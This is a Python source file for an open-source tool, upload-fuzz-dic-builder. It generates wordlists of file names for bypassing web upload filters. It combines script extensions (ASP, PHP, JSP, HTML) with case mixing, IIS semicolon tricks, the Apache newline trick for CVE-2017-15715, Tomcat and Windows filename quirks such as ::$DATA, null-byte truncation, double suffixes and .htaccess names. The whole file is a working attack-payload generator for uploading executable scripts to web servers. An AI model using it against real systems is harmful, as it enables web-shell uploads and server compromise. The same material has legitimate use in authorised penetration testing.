#coding=utf-8
'''
author: c0ny1<root@gv7.me>
github: https://github.com/c0ny1/upload-fuzz-dic-builder
date: 2018-11-04 23:16
description: 生成符合漏洞实际场景fuzz字典的脚本
'''

import argparse
import copy
import urllib

## 各类语言可解析的后缀
html_parse_suffix = ['html','htm','phtml','pht','Html','Htm','pHtml']
asp_parse_suffix = ['asp','aspx','asa','asax','ascx','ashx','asmx','cer','aSp','aSpx','aSa','aSax','aScx','aShx','aSmx','cEr']
php_parse_suffix = ['php','php5','php4','php3','php2','pHp','pHp5','pHp4','pHp3','pHp2']
jsp_parse_suffix = ['jsp','jspa','jspx','jsw','jsv','jspf','jtml','jSp','jSpx','jSpa','jSw','jSv','jSpf','jHtml']


## web中间件解析漏洞
def iis_suffix_creater(suffix):
	res = []
	for l in suffix:
		str ='%s;.%s' % (l,allow_suffix)
		res.append(str)
	return res

def apache_suffix_creater(suffix):
	res = []
	for l in suffix:
		str = '%s.xxx' % l
		res.append(str)
		str = '%s%s' % (l,urllib.unquote('%0a')) #CVE-2017-15715
		res.append(str)
	return res

win_tomcat = ['%20','::$DATA','/']
def tomcat_suffix_creater(suffix):
	res = []
	for l in suffix:
		for t in win_tomcat:
			str = '%s%s' % (l,t)
			res.append(str)
	return res

## 系统特性
def str_81_to_ff():
	res = []
	for i in range(129,256):
		str = '%x' % i
		str = '%' + str
		str = urllib.unquote(str)
		res.append(str)
	return res

windows_os = [' ','.','/','::$DATA','<','>','>>>','%20','%00'] + str_81_to_ff()

def windows_suffix_creater(suffix):
	res = []
	for s in suffix:
		for w in windows_os:
			str = '%s%s' % (s,w)
			res.append(str)
	return res

## 脚本语言漏洞（00截断）
def str_00_truncation(suffix,allow_suffix):
	res = []
	for i in suffix:
		str = '%s%s.%s' % (i,'%00',allow_suffix)
		res.append(str)
		str = '%s%s.%s' % (i,urllib.unquote('%00'),allow_suffix)
		res.append(str)
	return res
	
## 返回字符串所有大写可能
def str_case_mixing(word):
	str_list = []
	word = word.lower()
	tempWord = copy.deepcopy(word)
	plist = []
	redict = {}
	for char in range( len( tempWord ) ):
		char = word[char]
		plist.append(char) 
	num = len( plist )
	for i in range( num ):
		for j in range( i , num + 1 ):
			sContent = ''.join( plist[0:i] )
			mContent = ''.join( plist[i:j] )
			mContent = mContent.upper()
			eContent = ''.join( plist[j:] )
			content = '''%s%s%s''' % (sContent,mContent,eContent)
			redict[content] = None

	for i in redict.keys():
		str_list.append(i)

	return str_list
	
## list大小写混合
def list_case_mixing(li):
	res = []
	for l in li:
		res += str_case_mixing(l)
	return res
	
## 双后缀生成
def str_double_suffix_creater(suffix):
	res = []
	for i in range(1,len(suffix)):
		str = list(suffix)
		str.insert(i,suffix)
		res.append("".join(str))
	return res

def list_double_suffix_creater(list_suffix):
	res = []
	for l in list_suffix:
		res += str_double_suffix_creater(l)
	return duplicate_removal(res)
		
#list 去重
def duplicate_removal(li):
	return list(set(li))

#list 去空行
def clear_list(li):
	rmstr = ['',' ',None]
	for l in li:
		for r in rmstr:
			if l == r:
				li.remove(r)
	return li	
	
def parse_args():
	parser = argparse.ArgumentParser(prog='upload-fuzz-dic-builder',
									formatter_class=argparse.RawTextHelpFormatter,
									description='')
									
	parser.add_argument('-n','--upload-filename',metavar='',dest='upload_file_name', type=str, default='test', 
						help=u'Upload file name')
						
	parser.add_argument('-a','--allow-suffix',metavar='',dest='allow_suffix', type=str, default='jpg', 
						help=u'Allowable upload suffix')
	
	parser.add_argument('-l','--language',metavar='',dest='language',choices=['asp','php','jsp','all'], type=str, default='all', 
						help='Uploaded script language')

	parser.add_argument('-m','--middleware',metavar='',dest='middleware',choices=['iis','apache','tomcat','all'],type=str, default='all', 
						help='Middleware used in Web System')
	parser.add_argument('--os',metavar='',dest='os', choices=['win','linux','all'],type=str, default='all', 
						help='Target operating system type')
						
	parser.add_argument('-d','--double-suffix',dest='double_suffix', default=False,action='store_true', 
						help='Is it possible to generate double suffix?')						
	parser.add_argument('-o','--output',metavar='',dest='output_filename', type=str, default='upload_fuzz_dic.txt', 
						help='Output file')
						
	args = parser.parse_args()
	return args

if __name__ == '__main__':

	args = parse_args()
	upload_file_name = args.upload_file_name
	allow_suffix = args.allow_suffix
	output_filename =args.output_filename
	
	language = args.language
	middleware = args.middleware
	os = args.os
	double_suffix =args.double_suffix
	
	if middleware == 'iis':
		os = 'win'

	###################################
	
	f = open(output_filename,'w')
	parse_suffix = []
	case_parse_suffix = []
	middleware_parse_suffix = []
	htaccess_suffix = []
	os_parse_suffix = []
	double_parse_suffix = []
	
	
	# 可解析后缀
	if language ==  'asp':
		html_parse_suffix = []
		php_parse_suffix = []
		jsp_parse_suffix = []
		parse_suffix = asp_parse_suffix
	elif language == 'php':
		asp_parse_suffix = []
		jsp_parse_suffix = []
		parse_suffix = html_parse_suffix + php_parse_suffix
	elif language == 'jsp':
		html_parse_suffix = []
		asp_parse_suffix = []
		php_parse_suffix = []
		parse_suffix = jsp_parse_suffix
	else: # language == 'all'
		parse_suffix = html_parse_suffix + asp_parse_suffix + php_parse_suffix + jsp_parse_suffix
	print u'[+] 收集%d条可解析后缀完毕！' % len(parse_suffix)
	
	# 可解析后缀 + 大小写混合
	if os == 'win' or os == 'all':
		case_html_parse_suffix = list_case_mixing(html_parse_suffix)
		case_asp_parse_suffix = list_case_mixing(asp_parse_suffix)
		case_php_parse_suffix = list_case_mixing(php_parse_suffix)
		case_jsp_parse_suffix = list_case_mixing(jsp_parse_suffix)
		case_parse_suffix = list_case_mixing(parse_suffix)
		print u'[+] 加入%d条可解析后缀大小写混合完毕！' % len(case_parse_suffix)
	else: # os == 'linux'
		case_html_parse_suffix = html_parse_suffix
		case_asp_parse_suffix = asp_parse_suffix
		case_php_parse_suffix = php_parse_suffix
		case_jsp_parse_suffix = jsp_parse_suffix
		case_parse_suffix = parse_suffix
		
	# 中间件漏洞
	if middleware == 'iis':
		case_asp_php_jsp_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_jsp_parse_suffix
		middleware_parse_suffix = iis_suffix_creater(case_asp_php_jsp_parse_suffix)
	elif middleware == 'apache':
		case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix
		middleware_parse_suffix = apache_suffix_creater(case_asp_php_html_parse_suffix)
	elif middleware == 'tomcat' and os == 'linux':
		middleware_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix
	elif middleware == 'tomcat' and (os == 'win' or os == 'all'):
		case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix
		middleware_parse_suffix = tomcat_suffix_creater(case_php_jsp_parse_suffix)
	else:
		case_asp_php_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix
		iis_parse_suffix = iis_suffix_creater(case_asp_php_parse_suffix)
		case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix
		apache_parse_suffix = apache_suffix_creater(case_asp_php_html_parse_suffix)
		case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix
		tomcat_parse_suffix = tomcat_suffix_creater(case_php_jsp_parse_suffix)		
		middleware_parse_suffix = iis_parse_suffix + apache_parse_suffix + tomcat_parse_suffix
	
	middleware_parse_suffix = duplicate_removal(middleware_parse_suffix)
	print u'[+] 加入%d条中间件漏洞完毕！' % len(middleware_parse_suffix)
	
	# .htaccess
	if (middleware == 'apache' or middleware == 'all') and (os == 'win' or os == 'all'):
		htaccess_suffix = str_case_mixing(".htaccess")
		print u'[+] 加入%d条.htaccess完毕！' % len(htaccess_suffix)
	elif (middleware == 'apache' or middleware == 'all') and os == 'linux':
		htaccess_suffix = ['.htaccess']
		print u'[+] 加入1条.htaccess'
	else:
		htaccess_suffix = []
	
	# 系统特性
	if os == 'win':
		os_parse_suffix = windows_suffix_creater(case_parse_suffix)
	elif os == 'linux':
		os_parse_suffix = parse_suffix
	else:
		win_suffix = windows_suffix_creater(case_parse_suffix)
		linux_suffix = parse_suffix
		os_parse_suffix = win_suffix + linux_suffix
	
	os_parse_suffix = duplicate_removal(os_parse_suffix)
	print u'[+] 加入%d条系统特性完毕！' % len(os_parse_suffix)
	
	# 语言漏洞
	
	language_parse_suffux = str_00_truncation(case_parse_suffix,allow_suffix)
	
	# 双后缀 + 大小写混合
	if double_suffix:
		double_parse_suffix = list_double_suffix_creater(case_parse_suffix)
		print u'[+] 加入%d条双后缀完毕！' % len(double_parse_suffix)
	else:
		double_parse_suffix = []
		
	all_parse_suffix = case_parse_suffix + middleware_parse_suffix + os_parse_suffix + language_parse_suffux + double_parse_suffix
	all_parse_suffix = duplicate_removal(all_parse_suffix)
	all_parse_suffix = clear_list(all_parse_suffix)
	# 写文件
	num = len(all_parse_suffix)
	for i in all_parse_suffix:
		str = '%s.%s' % (upload_file_name,i)
		#print '[+] '+type(str)
		f.write(str)
		f.write('\n')
	num += len(htaccess_suffix)
	for i in htaccess_suffix:
		f.write(i)
		f.write('\n')
	f.close()
	print u'[+] 去重后共%s条数据写入%s文件' % (num,output_filename)
